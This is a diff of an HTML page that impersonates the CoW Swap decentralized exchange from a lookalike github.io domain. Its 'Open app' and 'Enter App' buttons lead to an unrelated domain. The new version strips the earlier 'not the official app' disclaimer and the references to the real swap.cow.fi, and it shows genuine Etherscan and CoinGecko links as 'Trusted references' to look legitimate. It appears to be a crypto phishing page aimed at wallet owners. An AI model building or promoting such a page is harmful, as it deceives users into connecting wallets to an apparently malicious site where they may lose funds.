@@ -1,47 +1,118 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>CoW Swap - Open App</title><meta name="description" content="cow swap opens the CoW Protocol trading interface for intent-based swaps, limit orders, and TWAPs with MEV-aware execution.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://cowswap-app.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="CoW Swap - Open App"><meta property="og:description" content="cow swap opens the CoW Protocol trading interface for intent-based swaps, limit orders, and TWAPs with MEV-aware execution.">
-<meta property="og:url" content="https://cowswap-app.github.io/"><meta property="og:image" content="https://cowswap-app.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="CoW Swap - Open App"><meta name="twitter:description" content="cow swap opens the CoW Protocol trading interface for intent-based swaps, limit orders, and TWAPs with MEV-aware execution."><meta name="twitter:image" content="https://cowswap-app.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://cowswap-app.github.io/#website", "url": "https://cowswap-app.github.io/", "name": "CoW Swap"}, {"@type": "WebPage", "@id": "https://cowswap-app.github.io/#webpage", "url": "https://cowswap-app.github.io/", "name": "CoW Swap - Open App", "description": "cow swap opens the CoW Protocol trading interface for intent-based swaps, limit orders, and TWAPs with MEV-aware execution.", "inLanguage": "en", "isPartOf": {"@id": "https://cowswap-app.github.io/#website"}}, {"@type": "Organization", "@id": "https://cowswap-app.github.io/#org", "name": "CoW Swap", "url": "https://cowswap-app.github.io/", "logo": "https://cowswap-app.github.io/og-cover.png", "sameAs": ["https://twitter.com/CoWSwap", "https://github.com/cowprotocol", "https://www.coingecko.com/en/coins/cow-protocol"]}, {"@type": "WebApplication", "@id": "https://cowswap-app.github.io/#app", "name": "CoW Swap", "url": "https://cowswap-app.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "cow swap opens the CoW Protocol trading interface for intent-based swaps, limit orders, and TWAPs with MEV-aware execution.", "featureList": ["Built on CoW Protocol", "Intent-based orders", "Market, limit, TWAP"], "isPartOf": {"@id": "https://cowswap-app.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://cowswap-app.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is CoW Swap?", "acceptedAnswer": {"@type": "Answer", "text": "CoW Swap is the first trading interface built on top of CoW Protocol. Users sign trade intents, and solvers compete to execute those intents through available liquidity. It is not just a pool swap interface; the protocol can settle orders through batch auctions, coincidence-of-wants matching and external liquidity routes when they satisfy the user's order constraints."}}, {"@type": "Question", "name": "What does COW token do?", "acceptedAnswer": {"@type": "Answer", "text": "COW is the governance token associated with CoW Protocol and CoW DAO. Token details, markets and contract references should be checked through official CoW resources and established market-data pages such as CoinGecko before taking action. Holding or trading COW is separate from using CoW Swap to sign a token swap order."}}, {"@type": "Question", "name": "Is CoW Swap cheaper than Uniswap?", "acceptedAnswer": {"@type": "Answer", "text": "CoW Swap can be cheaper for some orders, especially when solver competition, batch settlement or price improvement produces a better net outcome. It is not guaranteed to be cheaper for every token pair or amount. Compare the exact quoted received amount, any app-displayed fees, gas assumptions, slippage and approval requirements against Uniswap or another DEX before signing."}}, {"@type": "Question", "name": "Does CoW Swap require ETH for gas?", "acceptedAnswer": {"@type": "Answer", "text": "Gas handling depends on the chain, order type and current interface behavior. Users may still need the native gas token for approvals or transactions, even though CoW Protocol's solver model can change how settlement costs are handled. The safe habit is to keep enough native gas token for approvals, cancellations or wallet actions on the network you are using."}}, {"@type": "Question", "name": "Can CoW Swap use Safe wallets?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. CoW Swap documentation lists multisig wallets such as Safe among supported wallet options. That matters for DAO treasuries and teams because orders can be signed through smart contract wallet flows. Safe users should still check the app domain, chain, order data, signers, expiry and token approvals before executing a trade."}}, {"@type": "Question", "name": "Why is it called CoW Swap?", "acceptedAnswer": {"@type": "Answer", "text": "The name comes from coincidence of wants, where two or more users' intents can be matched directly when their desired trades offset each other. CoW Protocol also uses solver competition and external liquidity, so not every order is matched peer-to-peer. The key idea is that users express outcomes and solvers compete to produce valid settlement."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="CoW Swap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">CoW Swap</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>CoW Swap</h1>
-      <div class="bridge-widget" role="group" aria-label="CoW Swap preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open CoW Swap ↗</a></div>
-      <p class="hero-note">Live preview — open the official CoW Swap app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Built on CoW Protocol</span><span class="trust-chip">Intent-based orders</span><span class="trust-chip">Market, limit, TWAP</span></div>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CowSwap</title>
+  <meta name="description" content="CowSwap is a decentralized exchange that settles swaps with MEV protection from your own wallet.">
+  <link rel="canonical" href="https://cowswap-app.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F8FA">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="CowSwap">
+  <meta property="og:description" content="CowSwap is a decentralized exchange that settles swaps with MEV protection from your own wallet.">
+  <meta property="og:url" content="https://cowswap-app.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CowSwap">
+  <meta name="twitter:description" content="CowSwap is a decentralized exchange that settles swaps with MEV protection from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://cowswap-app.github.io/#website",
+        "url": "https://cowswap-app.github.io/",
+        "name": "CowSwap",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://cowswap-app.github.io/#app",
+        "name": "CowSwap",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://cowswap-app.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://cowswap-app.github.io/#organization",
+        "name": "CowSwap",
+        "url": "https://cowswap-app.github.io/",
+        "sameAs": ["https://cow.fi/"]
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="CowSwap">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>CowSwap</span>
     </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is CoW Swap?</h2><div class="capsule"><strong>CoW Swap</strong> is the first interface built on top of <a class="inline-link" href="https://docs.cow.fi/cow-protocol" rel="noopener noreferrer">CoW Protocol</a> and a reference implementation for its intent-based trading UX. Verify that role in the <a href="https://docs.cow.fi/cow-protocol/tutorials/cow-swap">official CoW Protocol docs</a> before launching the app.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>CoW Swap at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Intent-based DEX aggregator</b></div><div class="f"><small>Network</small><b>Ethereum and <a class="inline-link" href="https://ethereum.org/en/developers/docs/evm/" rel="noopener noreferrer">EVM-compatible chains</a></b></div><div class="f"><small>Token</small><b>COW</b></div><div class="f"><small>Custody</small><b>Non-custodial order signing</b></div><div class="f"><small>Official app</small><b>swap.cow.fi</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>CoW Swap fees and solver execution</h2><div class="intent-a">CoW Swap fees are tied to CoW Protocol's intent and solver model rather than a simple pool fee selected by the user. A user signs an order, and solvers compete to settle it through on-chain liquidity, private inventory or <a class="inline-link" href="https://www.investopedia.com/terms/c/coincidence_of_wants.asp" rel="noopener noreferrer">coincidence-of-wants matches</a>. The user should evaluate the final quote, surplus, expiry, gas treatment and any app-displayed fee before signing. CoW Swap is especially relevant for searches around <a class="inline-link" href="https://blog.chain.link/what-is-minimal-extractable-value-mev/" rel="noopener noreferrer">MEV-aware trading</a> because orders are batch-auctioned and settled by solvers instead of being pushed directly through a public mempool swap path.</div></div></section><section class="section"><div class="container"><h2>CoW Swap MEV protection</h2><div class="intent-a">CoW Swap is built on CoW Protocol, which emphasizes MEV protection by letting users sign trade intents and having solvers compete to execute them. The official benefits docs describe MEV protection and price improvement as core protocol benefits. In practice, that means users are not manually selecting one liquidity pool; they are asking the protocol to find acceptable execution for a signed order. This model can reduce exposure to <a class="inline-link" href="https://www.coinbase.com/learn/crypto-basics/what-is-a-sandwich-attack-in-crypto-and-how-to-avoid-it" rel="noopener noreferrer">sandwich attacks</a>, but users still need to check token approvals, order expiry, sell amount, buy amount and the final quote shown by the interface.</div></div></section><section class="section section-alt"><div class="container"><h2>CoW Swap limit orders and TWAP orders</h2><div class="intent-a">CoW Swap supports more than basic market swaps. The official CoW Swap docs list market orders, <a class="inline-link" href="https://academy.binance.com/en/articles/what-are-cross-chain-swaps" rel="noopener noreferrer">cross-chain swaps</a>, limit orders, TWAP orders, native token flows and custom links in the tutorial section. A limit order lets the user define a target price or minimum outcome, while a <a class="inline-link" href="https://www.investopedia.com/terms/t/twap.asp" rel="noopener noreferrer">TWAP splits execution over time</a>. These order types are useful for users searching for better execution control, but they require closer review of expiry, partial-fill behavior, sell token, buy token and chain support before signing an intent.</div></div></section><section class="section"><div class="container"><h2>CoW Swap supported wallets</h2><div class="intent-a">CoW Swap supports common Web3 wallet paths rather than a single required wallet. The official docs mention injected wallets such as MetaMask and Rabby, multisig wallets such as Safe, WalletConnect v2 compatible mobile wallets and hardware wallet paths through supported integrations. Smart contract wallets matter because CoW orders rely on signatures, including <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-712" rel="noopener noreferrer">EIP-712</a> and <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-1271" rel="noopener noreferrer">ERC-1271</a> style flows. Before trading, verify the wallet is connected to the intended chain and that the signing prompt matches the order details shown in the app.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap CoW Swap</h2><ol class="steps"><li><b>Open the verified app</b><span>Use swap.cow.fi and check the domain before connecting a wallet.</span></li><li><b>Connect your wallet</b><span>Choose an injected wallet, Safe, WalletConnect-compatible mobile wallet, or supported hardware wallet path.</span></li><li><b>Set the order</b><span>Pick the network, sell token, buy token, amount, and order type such as swap, limit, or TWAP.</span></li><li><b>Review and sign</b><span>Check output, expiry, <a class="inline-link" href="https://coinmarketcap.com/academy/glossary/slippage" rel="noopener noreferrer">slippage</a>, and approval prompts, then sign the intent from your wallet.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official CoW Swap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open CoW Swap ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>CoW Swap vs Uniswap</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>CoW Swap</th><th>Uniswap</th></tr></thead><tbody><tr><td>Execution model</td><td>Signed intents settled by competing solvers</td><td><a class="inline-link" href="https://www.gemini.com/cryptopedia/automated-market-maker-amm" rel="noopener noreferrer">Direct AMM swaps</a> through liquidity pools</td></tr><tr><td>MEV handling</td><td>Designed around batch auctions and MEV protection</td><td>Depends on route, wallet settings and transaction path</td></tr><tr><td>Order types</td><td>Market, limit and TWAP-style flows</td><td>Mostly swap and LP flows in the core app</td></tr><tr><td>Best fit</td><td>MEV-aware or route-sensitive trades</td><td>Direct pool liquidity and broad token access</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>CoW Swap FAQ</h2><div class="faq-list"><details open><summary><h3>What is CoW Swap?</h3></summary><div>CoW Swap is the first trading interface built on top of CoW Protocol. Users sign trade intents, and solvers compete to execute those intents through available liquidity. It is not just a pool swap interface; the protocol can settle orders through batch auctions, coincidence-of-wants matching and external liquidity routes when they satisfy the user's order constraints.</div></details><details><summary><h3>What does COW token do?</h3></summary><div>COW is the <a class="inline-link" href="https://www.gemini.com/cryptopedia/governance-tokens-crypto" rel="noopener noreferrer">governance token</a> associated with CoW Protocol and CoW DAO. Token details, markets and contract references should be checked through official CoW resources and established market-data pages such as <a class="inline-link" href="https://www.coingecko.com/en/coins/cow-protocol" rel="noopener noreferrer">CoinGecko</a> before taking action. Holding or trading COW is separate from using CoW Swap to sign a token swap order.</div></details><details><summary><h3>Is CoW Swap cheaper than Uniswap?</h3></summary><div>CoW Swap can be cheaper for some orders, especially when solver competition, batch settlement or price improvement produces a better net outcome. It is not guaranteed to be cheaper for every token pair or amount. Compare the exact quoted received amount, any app-displayed fees, gas assumptions, slippage and approval requirements against Uniswap or another DEX before signing.</div></details><details><summary><h3>Does CoW Swap require ETH for gas?</h3></summary><div>Gas handling depends on the chain, order type and current interface behavior. Users may still need the native gas token for approvals or transactions, even though CoW Protocol's solver model can change how settlement costs are handled. The safe habit is to keep enough native gas token for approvals, cancellations or wallet actions on the network you are using.</div></details><details><summary><h3>Can CoW Swap use Safe wallets?</h3></summary><div>Yes. CoW Swap documentation lists multisig wallets such as Safe among supported wallet options. That matters for DAO treasuries and teams because orders can be signed through smart contract wallet flows. Safe users should still check the app domain, chain, order data, signers, expiry and token approvals before executing a trade.</div></details><details><summary><h3>Why is it called CoW Swap?</h3></summary><div>The name comes from coincidence of wants, where two or more users' intents can be matched directly when their desired trades offset each other. CoW Protocol also uses solver competition and external liquidity, so not every order is matched peer-to-peer. The key idea is that users express outcomes and solvers compete to produce valid settlement.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">This page is not the official app; verify swap.cow.fi before connecting a wallet; educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/token/0xdef1ca1fb7fbcdc777520aa7f396b4e015f497ab" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://www.coingecko.com/en/coins/cow-protocol" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://ethereum.org/defi/" target="_blank" rel="nofollow noopener noreferrer">Ethereum DeFi</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="CowSwap">
+      <h1>CowSwap</h1>
+      <p class="sub"><strong>CowSwap</strong> is a decentralized exchange that settles swaps with MEV protection from your own wallet.</p>
+    </section>
+
+    <section class="swap-card" aria-label="Swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="asset">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+
+        <button class="switch" type="button" data-switch aria-label="Switch direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="asset">
+            <img src="usdc.png" width="28" height="28" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">CowSwap &mdash; 2026</footer>
+
+  <script>
+  (function(){
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function(){
+      var assets = document.querySelectorAll(".asset");
+      if (assets.length < 2) return;
+      var first = assets[0].innerHTML;
+      assets[0].innerHTML = assets[1].innerHTML;
+      assets[1].innerHTML = first;
+      button.classList.toggle("turned");
+    });
+  })();
+  </script>
+</body>
+</html>
